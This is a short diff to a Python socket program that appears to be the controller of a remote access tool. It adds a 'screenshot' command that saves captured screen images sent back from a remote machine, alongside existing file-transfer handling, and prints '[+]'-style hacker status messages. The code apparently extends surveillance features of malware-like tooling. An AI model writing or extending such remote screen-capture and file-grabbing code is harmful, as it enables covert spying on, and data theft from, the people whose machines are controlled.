@@ -68,6 +68,15 @@ with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                     data = write_file(command[2], data)
                 else:
                     data = write_file(command[1], data)
+
+            if command[0] == "screenshot" and "[+] Error" not in data:
+                if len(command) > 1:
+                    data = write_file(command[1], data)
+                    print("[+] Screenshot taken")
+                else:
+                    data = write_file("screenshot.png", data)
+                    print("[+] Default location used. Please use screenshot (path) unless you want your "
+                          "screenshot overwritten")
         except Exception:
             data = "[+] Error"
 
